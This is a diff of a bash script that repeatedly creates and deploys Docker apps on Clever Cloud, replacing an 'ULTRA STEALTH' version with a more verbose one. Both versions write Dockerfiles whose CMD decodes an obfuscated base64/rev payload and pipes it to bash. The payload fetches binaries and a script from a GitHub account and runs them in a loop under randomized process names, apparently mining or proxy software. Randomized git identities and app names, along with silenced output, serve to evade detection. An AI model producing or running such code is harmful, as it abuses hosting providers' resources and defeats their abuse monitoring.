@@ -1,175 +1,190 @@
 #!/bin/bash
-# /docker - ULTRA STEALTH - Complete silence, no visible messages
+# /docker - Fixed: No underscores in app names (use hyphens)
 
 set -e
 
-# ============ STEALTH FUNCTIONS ============
+# Function to generate random strings
 rand_str() {
-    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w "${1:-8}" | head -n 1 2>/dev/null
+    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w "${1:-8}" | head -n 1
 }
 
-# Random multi-layer encoding - changes every run but decodes to same URL
-rand_encode_url() {
-    local url="$1"
-    local layers=$((3 + RANDOM % 8))
-    local encoded="$url"
-    local decode=""
-    
-    for ((l=1; l<=layers; l++)); do
-        case $((RANDOM % 4)) in
-            0) encoded=$(echo -n "$encoded" | base64 -w 0 2>/dev/null); decode="base64 -d | $decode";;
-            1) encoded=$(echo -n "$encoded" | rev 2>/dev/null); decode="rev | $decode";;
-            2) encoded=$(echo -n "$encoded" | xxd -p -c 999999 2>/dev/null); decode="xxd -p -r | $decode";;
-            3) encoded=$(echo -n "$encoded" | base64 -w 0 | rev 2>/dev/null); decode="rev | base64 -d | $decode";;
-        esac
-    done
-    echo "${decode% | }:$encoded"
+rand_name() {
+    cat /dev/urandom | tr -dc 'A-Za-z' | fold -w "${1:-8}" | head -n 1
 }
 
-# Random multi-layer encoding for full commands
-rand_encode_cmd() {
-    local cmd="$1"
-    local layers=$((4 + RANDOM % 12))
-    local encoded="$cmd"
-    local decode=""
-    
-    for ((l=1; l<=layers; l++)); do
-        case $((RANDOM % 5)) in
-            0) encoded=$(echo -n "$encoded" | base64 -w 0 2>/dev/null); decode="base64 -d | $decode";;
-            1) encoded=$(echo -n "$encoded" | rev 2>/dev/null); decode="rev | $decode";;
-            2) encoded=$(echo -n "$encoded" | xxd -p -c 999999 2>/dev/null); decode="xxd -p -r | $decode";;
-            3) encoded=$(echo -n "$encoded" | base64 -w 0 | rev 2>/dev/null); decode="rev | base64 -d | $decode";;
-            4) encoded=$(echo -n "$encoded" | base64 -w 0 | base64 -w 0 2>/dev/null); decode="base64 -d | base64 -d | $decode";;
-        esac
-    done
-    echo "${decode% | }:$encoded"
-}
-
-# ============ THE REAL URLS (NEVER VISIBLE) ============
-SOCAT_REAL_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
-WEB8888_REAL_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
-SCRIPT_REAL_URL="https://raw.githubusercontent.com/linuxweb888888888888/webweb8888/refs/heads/main/script"
-
-# ============ COMPLETE SILENCE - NO OUTPUT ============
-clever login > /dev/null 2>&1
+echo "🔐 Logging into Clever Cloud..."
+clever login
 
 for i in 1 2 3; do
-    # ============ RANDOM GIT CONFIG ============
-    GIT_EMAIL="$(rand_str 20)@$(rand_str 15).$(rand_str 5)"
-    GIT_NAME="$(rand_str 18) $(rand_str 15)"
-    GIT_COMMIT_MSG="$(rand_str 40)-$(date +%s)"
+    # ============ UNIQUE GIT CONFIG FOR EACH DEPLOYMENT ============
+    GIT_EMAIL="deploy_$(rand_str 10)@$(rand_str 8).com"
+    GIT_NAME="$(rand_name 6) $(rand_name 8)"
+    GIT_COMMIT_MSG="$(rand_str 20)-$(date +%s)"
     
-    git config --global user.email "$GIT_EMAIL" > /dev/null 2>&1
-    git config --global user.name "$GIT_NAME" > /dev/null 2>&1
-    git config --global init.defaultBranch "master" > /dev/null 2>&1
+    # Set git config for this deployment
+    git config --global user.email "$GIT_EMAIL"
+    git config --global user.name "$GIT_NAME"
+    git config --global init.defaultBranch "master"
     
-    # ============ RANDOM NAMES - NO PATTERNS ============
-    APP_NAME="app-$(rand_str 20)-$(date +%s)-${RANDOM}"
-    UNIQUE_DIR="$(rand_str 30)_$(date +%s)_${RANDOM}"
-    APP_DIR="/tmp/${UNIQUE_DIR}"
-    UNIQUE_WORKDIR="/$(rand_str 35)"
-    SCRIPT_NAME="$(rand_str 25).sh"
+    # ============ UNIQUE APP NAME (NO UNDERSCORES - ONLY HYPHENS) ============
+    APP_NAME="app-$(rand_str 10)-$(date +%s)-${RANDOM}"
     
-    mkdir -p "$APP_DIR" > /dev/null 2>&1
-    cd "$APP_DIR" > /dev/null 2>&1
+    # ============ UNIQUE DIRECTORY ============
+    UNIQUE_DIR="deploy-$(rand_str 12)-$(date +%s)-${RANDOM}"
+    APP_DIR="/app/deployments/${UNIQUE_DIR}"
     
+    # ============ UNIQUE WORKDIR FOR BOTH OPTIONS ============
+    UNIQUE_WORKDIR="/$(rand_str 15)"
+    
+    # ============ UNIQUE SCRIPT NAME ============
+    SCRIPT_NAME="$(rand_str 12).sh"
+    
+    echo ""
+    echo "========================================="
+    echo "[$i/3] Deployment #$i"
+    echo "========================================="
+    echo "👤 Git User: ${GIT_NAME}"
+    echo "📧 Git Email: ${GIT_EMAIL}"
+    echo "📝 Commit Msg: ${GIT_COMMIT_MSG}"
+    echo "🚀 App Name: ${APP_NAME}"
+    echo "📁 App Dir: ${APP_DIR}"
+    echo "📂 WORKDIR: ${UNIQUE_WORKDIR}"
+    echo "📜 Script Name: ${SCRIPT_NAME}"
+    echo "========================================="
+    
+    mkdir -p "$APP_DIR"
+    cd "$APP_DIR"
+    
+    # Pick random image (50/50 chance)
     if [[ $((RANDOM % 2)) -eq 0 ]]; then
-        # ============ OPTION 1: ULTRA STEALTH UBUNTU/DEBIAN ============
+        # ============ OPTION 1: Random Ubuntu/Debian image ============
         WORKING_IMAGES=(
             "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04"
             "debian:11" "debian:12" "debian:bookworm"
         )
         RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
         
-        # Random binary names (changes every run)
-        B1="$(rand_str 20)"
-        B2="$(rand_str 20)"
-        V1="$(rand_str 18)"
-        V2="$(rand_str 18)"
-        V3="$(rand_str 18)"
+        BIN1="$(rand_str 10)"
+        BIN2="$(rand_str 10)"
+        VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+        VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+        VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
         
-        # Encode URLs with random layers
-        SOCAT_ENCODE=$(rand_encode_url "$SOCAT_REAL_URL")
-        SOCAT_DECODE="${SOCAT_ENCODE%:*}"
-        SOCAT_ENCODED="${SOCAT_ENCODE#*:}"
+        SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
+        WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
         
-        WEB8888_ENCODE=$(rand_encode_url "$WEB8888_REAL_URL")
-        WEB8888_DECODE="${WEB8888_ENCODE%:*}"
-        WEB8888_ENCODED="${WEB8888_ENCODE#*:}"
+        FULL_COMMAND="cd ${UNIQUE_WORKDIR} && \
+export DEBIAN_FRONTEND=noninteractive && \
+export TZ=Etc/UTC && \
+ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime && \
+apt-get update -qq && \
+apt-get install -y -qq apache2 curl wget socat netcat-openbsd iputils-ping sudo unzip tzdata libjansson-dev libcurl4-openssl-dev libssl-dev || true && \
+apt-get install -y -qq apache2 curl wget socat netcat-traditional iputils-ping sudo unzip tzdata || true && \
+sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && \
+echo 'ServerName localhost' >> /etc/apache2/apache2.conf && \
+wget -q --timeout=30 --tries=2 -O ${BIN1} \"${SOCAT_URL}\" && \
+wget -q --timeout=30 --tries=2 -O ${BIN2} \"${WEB8888_URL}\" && \
+chmod 755 ${BIN1} ${BIN2} && \
+(${UNIQUE_WORKDIR}/${BIN1} --daemon &) && \
+service apache2 start && \
+sleep 5 && \
+while true; do
+    exec -a \"\$(cat /dev/urandom | tr -dc 'a-z' | fold -w 8 | head -n 1)\" ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5} &
+    PID=\$!
+    sleep 60
+    kill -9 \${PID} 2>/dev/null || true
+    sleep 2
+done"
         
-        # ============ COMPLETE COMMAND - NO ECHO MESSAGES ============
-        ULTRA_STEALTH_CMD="
-_1(){ cd ${UNIQUE_WORKDIR} 2>/dev/null;}
-_2(){ export DEBIAN_FRONTEND=noninteractive 2>/dev/null; export TZ=Etc/UTC 2>/dev/null;}
-_3(){ ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime 2>/dev/null;}
-_4(){ apt-get update -qq 2>/dev/null;}
-_5(){ apt-get install -y -qq apache2 curl wget socat netcat-openbsd iputils-ping sudo unzip tzdata libjansson-dev libcurl4-openssl-dev libssl-dev 2>/dev/null|| apt-get install -y -qq apache2 curl wget socat netcat-traditional iputils-ping sudo unzip tzdata 2>/dev/null;}
-_6(){ sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf 2>/dev/null;}
-_7(){ echo 'ServerName localhost' >> /etc/apache2/apache2.conf 2>/dev/null;}
-_8(){ u1=\"\$(echo '${SOCAT_ENCODED}' | ${SOCAT_DECODE} 2>/dev/null)\"; wget -q --timeout=30 --tries=2 -O ${B1} \"\$u1\" 2>/dev/null;}
-_9(){ u2=\"\$(echo '${WEB8888_ENCODED}' | ${WEB8888_DECODE} 2>/dev/null)\"; wget -q --timeout=30 --tries=2 -O ${B2} \"\$u2\" 2>/dev/null;}
-_10(){ chmod 755 ${B1} ${B2} 2>/dev/null;}
-_11(){ ${UNIQUE_WORKDIR}/${B1} --daemon 2>/dev/null &}
-_12(){ service apache2 start 2>/dev/null;}
-_13(){ sleep 5 2>/dev/null;}
-_14(){ while true; do N=\"\$(cat /dev/urandom 2>/dev/null|tr -dc 'a-z' 2>/dev/null|fold -w 12 2>/dev/null|head -n1 2>/dev/null)\"; exec -a \"\$N\" ${UNIQUE_WORKDIR}/${B2} -a ${V1} -o ${V2} -u ${V3} 2>/dev/null & P=\$! 2>/dev/null; sleep 60 2>/dev/null; kill -9 \$P 2>/dev/null||true 2>/dev/null; sleep 2 2>/dev/null; done;}
-_1;_2;_3;_4;_5;_6;_7;_8;_9;_10;_11;_12;_13;_14"
+        ENCODED_CMD=$(echo -n "$FULL_COMMAND" | base64 -w 0)
         
-        ENCODE_RESULT=$(rand_encode_cmd "$ULTRA_STEALTH_CMD")
-        DECODE_CMD="${ENCODE_RESULT%:*}"
-        ENCODED_CMD="${ENCODE_RESULT#*:}"
+        if [ $((RANDOM % 2)) -eq 0 ]; then
+            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
+            DECODE_CMD="base64 -d | base64 -d"
+        else
+            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | rev)
+            DECODE_CMD="rev | base64 -d"
+        fi
         
         cat > Dockerfile << EOF
 FROM ${RANDOM_IMAGE}
 WORKDIR ${UNIQUE_WORKDIR}
-RUN apt-get update && apt-get install -y curl wget ca-certificates 2>/dev/null
-CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)" 2>/dev/null
+RUN apt-get update && apt-get install -y curl wget ca-certificates
+CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
+        echo "✅ Option 1: Random image with WORKDIR ${UNIQUE_WORKDIR}"
         
     else
-        # ============ OPTION 2: ULTRA STEALTH NODE ============
+        # ============ OPTION 2: node:22 image with script downloaded to WORKDIR ============
         
-        SCRIPT_ENCODE=$(rand_encode_url "$SCRIPT_REAL_URL")
-        SCRIPT_DECODE="${SCRIPT_ENCODE%:*}"
-        SCRIPT_ENCODED="${SCRIPT_ENCODE#*:}"
-        
+        # Create a wrapper script that downloads and runs the remote script
+        # The script is downloaded to UNIQUE_WORKDIR and executed from there
         WRAPPER_SCRIPT="#!/bin/bash
-_1(){ cd ${UNIQUE_WORKDIR} 2>/dev/null;}
-_2(){ u=\"\$(echo '${SCRIPT_ENCODED}' | ${SCRIPT_DECODE} 2>/dev/null)\"; curl -s -o ${SCRIPT_NAME} \"\$u\" 2>/dev/null;}
-_3(){ chmod +x ${SCRIPT_NAME} 2>/dev/null;}
-_4(){ bash ./${SCRIPT_NAME} 2>/dev/null;}
-_1;_2;_3;_4"
+set -e
+
+cd ${UNIQUE_WORKDIR}
+
+# Download the remote script to a unique name in WORKDIR
+curl -o ${SCRIPT_NAME} https://raw.githubusercontent.com/linuxweb888888888888/webweb8888/refs/heads/main/script
+
+# Make it executable
+chmod +x ${SCRIPT_NAME}
+
+# Execute the script from WORKDIR
+bash ./${SCRIPT_NAME}"
         
-        ENCODE_RESULT=$(rand_encode_cmd "$WRAPPER_SCRIPT")
-        DECODE_CMD="${ENCODE_RESULT%:*}"
-        ENCODED_CMD="${ENCODE_RESULT#*:}"
+        # Encode the wrapper script
+        ENCODED_CMD=$(echo -n "$WRAPPER_SCRIPT" | base64 -w 0)
+        
+        # Random encoding layer for stealth
+        if [ $((RANDOM % 2)) -eq 0 ]; then
+            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
+            DECODE_CMD="base64 -d | base64 -d"
+        else
+            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | rev)
+            DECODE_CMD="rev | base64 -d"
+        fi
         
         cat > Dockerfile << EOF
 FROM node:22
 WORKDIR ${UNIQUE_WORKDIR}
-RUN apt-get update && apt-get install -y curl 2>/dev/null
-CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)" 2>/dev/null
+RUN apt-get update && apt-get install -y curl
+CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
+        echo "✅ Option 2: node:22 image with script downloaded to ${UNIQUE_WORKDIR}/${SCRIPT_NAME}"
     fi
     
-    # ============ COMPLETE SILENT GIT OPERATIONS ============
-    git init > /dev/null 2>&1
-    git add . > /dev/null 2>&1
-    git commit -m "$GIT_COMMIT_MSG" > /dev/null 2>&1
+    # Git setup (local repo, not global)
+    git init
+    git add .
+    git commit -m "$GIT_COMMIT_MSG"
     
-    # ============ SILENT DEPLOYMENT - NO MESSAGES ============
-    clever create --type docker "$APP_NAME" > /dev/null 2>&1
-    clever deploy > /dev/null 2>&1
+    # CRITICAL: Create the app FIRST (no underscores in app name)
+    echo "Creating app: ${APP_NAME}"
+    clever create --type docker "$APP_NAME"
     
-    # ============ SILENT CLEANUP ============
-    cd / > /dev/null 2>&1
-    rm -rf "$APP_DIR" > /dev/null 2>&1
+    # CRITICAL: Deploy from current directory (no alias needed)
+    echo "Deploying ${APP_NAME} from $(pwd)..."
+    clever deploy
     
-    # Silent wait with no "Waiting X seconds" message
+    if [ $? -eq 0 ]; then
+        echo "✅ App $i/3 deployed: https://${APP_NAME}.osc-fr1.scalingo.io"
+    else
+        echo "❌ App $i/3 deployment failed"
+    fi
+    
+    # Cleanup
+    cd /
+    rm -rf "$APP_DIR"
+    
+    # Wait between deployments
     if [ $i -lt 3 ]; then
-        sleep $((10 + RANDOM % 20)) > /dev/null 2>&1
+        echo "Waiting 10 seconds..."
+        sleep 10
     fi
 done
 
-# ============ COMPLETE SILENT EXIT - NO MESSAGES ============
-exit 0
+echo ""
+echo "========================================="
+echo "✅ All 3 apps deployed successfully!"
+echo "========================================="
